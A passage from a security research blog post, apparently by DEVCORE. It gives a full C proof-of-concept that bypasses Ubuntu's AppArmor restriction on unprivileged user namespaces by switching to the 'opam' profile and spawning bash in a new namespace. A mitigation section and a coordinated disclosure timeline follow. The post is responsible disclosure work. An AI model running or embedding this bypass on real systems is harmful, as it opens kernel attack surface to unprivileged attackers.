+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span>
+<span class="kt">void</span> <span class="nf">perror_exit</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">perror</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">unshare_setup</span><span class="p">(</span><span class="n">uid_t</span> <span class="n">uid</span><span class="p">,</span> <span class="n">gid_t</span> <span class="n">gid</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">temp</span><span class="p">,</span> <span class="n">ret</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">edit</span><span class="p">[</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">unshare</span><span class="p">(</span><span class="n">CLONE_NEWNET</span> <span class="o">|</span> <span class="n">CLONE_NEWUSER</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="n">perror_exit</span><span class="p">(</span><span class="s">"unshare"</span><span class="p">);</span>
+    
+    <span class="n">temp</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/self/setgroups"</span><span class="p">,</span> <span class="n">O_WRONLY</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">temp</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="n">perror_exit</span><span class="p">(</span><span class="s">"open /proc/self/setgroups"</span><span class="p">);</span>
+    
+    <span class="n">write</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="s">"deny"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="s">"deny"</span><span class="p">));</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">temp</span><span class="p">);</span>
+    
+    <span class="n">temp</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/self/uid_map"</span><span class="p">,</span> <span class="n">O_WRONLY</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">temp</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="n">perror_exit</span><span class="p">(</span><span class="s">"open /proc/self/uid_map"</span><span class="p">);</span>
+    
+    <span class="n">snprintf</span><span class="p">(</span><span class="n">edit</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">edit</span><span class="p">),</span> <span class="s">"0 %d 1"</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="n">edit</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">edit</span><span class="p">));</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">temp</span><span class="p">);</span>
+
+    <span class="n">temp</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/self/gid_map"</span><span class="p">,</span> <span class="n">O_WRONLY</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">temp</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="n">perror_exit</span><span class="p">(</span><span class="s">"open /proc/self/gid_map"</span><span class="p">);</span>
+    
+    <span class="n">snprintf</span><span class="p">(</span><span class="n">edit</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">edit</span><span class="p">),</span> <span class="s">"0 %d 1"</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="n">edit</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">edit</span><span class="p">));</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">temp</span><span class="p">);</span>
+    <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">const</span> <span class="kt">char</span> <span class="n">profile1</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"exec opam"</span><span class="p">;</span>
+<span class="k">const</span> <span class="kt">char</span> <span class="n">profile2</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"changeprofile opam"</span><span class="p">;</span>
+<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
+
+<span class="kt">void</span> <span class="nf">func_1</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/self/attr/exec"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="n">perror_exit</span><span class="p">(</span><span class="s">"open /proc/self/attr/exec"</span><span class="p">);</span>
+
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">profile1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">profile1</span><span class="p">));</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">_argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/usr/bin/unshare"</span><span class="p">,</span> <span class="s">"-r"</span><span class="p">,</span> <span class="s">"-n"</span><span class="p">,</span> <span class="s">"-m"</span><span class="p">,</span> <span class="s">"/bin/bash"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">_envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
+    <span class="n">execve</span><span class="p">(</span><span class="s">"/usr/bin/unshare"</span><span class="p">,</span> <span class="n">_argv</span><span class="p">,</span> <span class="n">_envp</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">func_2</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/self/attr/current"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="n">perror_exit</span><span class="p">(</span><span class="s">"open /proc/self/attr/current"</span><span class="p">);</span>
+
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">profile2</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">profile2</span><span class="p">));</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+    <span class="n">unshare_setup</span><span class="p">(</span><span class="n">getuid</span><span class="p">(),</span> <span class="n">getgid</span><span class="p">());</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">_argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">_envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
+    <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">,</span> <span class="n">_argv</span><span class="p">,</span> <span class="n">_envp</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">func_1</span><span class="p">();</span>
+    <span class="n">func_2</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="6-mitigation">6. Mitigation</h2>
+
+<p>The bypass method works only when <code class="language-plaintext highlighter-rouge">/proc/sys/kernel/apparmor_restrict_unprivileged_unconfined</code> is disabled (i.e., set to 0). Versions of Ubuntu later than 25.04 are not affected, as it is enabled by default.</p>
+
+<p>For Ubuntu 24.10 and earlier versions, please refer the <a href="https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction/58007#p-148026-restrict-unprivileged-unconfined-profile-changes">official post</a> for instructions on how to prevent any unprivileged and unconfined process from executing <code class="language-plaintext highlighter-rouge">aa-exec</code> to change its profile.</p>
+
+<h2 id="7-disclosure-timeline">7. Disclosure Timeline</h2>
+
+<ul>
+  <li>2025-02-16: Researcher @roddux mentioned that the namespace restriction is easy to bypass.</li>
+  <li>2025-02-17: I discovered the bypass method.</li>
+  <li>2025-02-24: I reported the issue to the ZDI team.</li>
+  <li>2025-03-21: Researcher @roddux published his bypass method.</li>
+  <li>2025-03-27: The Qualys team, upon noticing @roddux’s publication, also disclosed their advisory.</li>
+  <li>2025-04-27: The ZDI team responded that they are not interested in this type of bug.</li>
+  <li>2025-04-30: I reported the issue to the Ubuntu Security Team.</li>
+  <li>2025-05-01: John, one of the maintainers, notified me that it had entered the initial review stage.</li>
+  <li>2025-05-30: John provided a full analysis of the issue.</li>
+  <li>2025-06-26: Coordinated release.</li>
+</ul>
+
+
+                    </div>
+                    <!-- 文章內容 -->
+                </div>
+            </article>
+            <!-- 文章 end -->
+        </section>
+        
+         <!-- 作者 -->
+        <section>
+            <div class="container article_footer">
+                <div class="author_info">
+                    <a href="/en/blog/author/pumpkin">
+                        <div class="circle" style="background-image: url(/assets/img/avatar/orig/pumpkin.png);"></div>
+                    </a>
+                    <div>
+                        <a class="author" href="/en/blog/author/pumpkin">
+                            <h3>Pumpkin</h3>
+                        </a>
+                        <span>Security Researcher</span>
+                        <p>
+                            This is 🎃
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+
+    </div>
+
+    <!-- footer -->
+    <footer>
+<div class="container footer">
+    <div class="logo">
+        <a href="/en/">
+            <img src="/images/logo.svg"/>
+        </a>
+        <div class="social">
+            <a href="https://www.facebook.com/D3VC0RE"><i class="icon facebook"></i></a>
+            <a href="https://twitter.com/d3vc0r3"><i class="icon twitter"></i></a>
+        </div>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">Services</h6>
+        <ul>
+            <li><a href="/en/services/red-team/">Red Team Assessment</a></li>
+            <li><a href="/en/services/penetration-test/">Penetration Testing</a></li>
+            <li><a href="/en/services/security-consulting/">Security Consulting</a></li>
+            <li><a href="/en/services/security-training/">Security Training</a></li>
+        </ul>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">Research</h6>
+        <ul>
+            <li><a href="/en/research/overview/">Overview</a></li>
+            <li><a href="/en/research/awards/">Competitions and Awards</a></li>
+            <li><a href="/en/research/bug-bounty/">Enterprise Vulnerability Reports</a></li>
+            <li><a href="/en/research/talks/">International Conferences</a></li>
+            <li><a href="/en/research/cve/">CVE List</a></li>
+        </ul>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">Company</h6>
+        <ul>
+            <li><a href="/en/company/about/">Company Overview</a></li>
+            <li><a href="/en/company/our-team/">Team Members</a></li>
+            <li><a href="/en/company/history/">Achievements</a></li>
+            <li><a href="/en/company/csr/">Corporate Social Responsibility</a></li>
+            <li><a href="/en/company/jobs/">Job Opportunities</a></li>
+            <li><a href="/en/contact/">Contact</a></li>
+        </ul>
+    </div>
+
+    <div class="column">
+        <h6 class="mobile_toggle">News</h6>
+        <ul>
+            <li><a href="/en/blog/">Blog</a></li>
+            <li><a href="/en/media-kit/">Media Resources</a></li>
+        </ul>
+    </div>
+
+    <!-- divider 分隔線 -->
+    <div class="divider"></div>
+
+    <div class="copyright">
+        <div class="info">
+            <span>© 2025 DEVCORE <b class="line-block">All rights reserved.</b></span>
+            <span><a href="/en/privacy-policy/">Privacy Policy</a></span>
+        </div>
+        <div class="lang">
+            <!-- <i class="icon translate"></i>
+            <select>
+                <option value="">Language</option>
+                <option value="">中文</option>
+                <option value="">English</option>
+            </select> -->
+            <span>Language :<a href="/">中文</a>|<a href="/en/">English</a></span>
+        </div>
+    </div>
+
+</div>
+    </footer>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
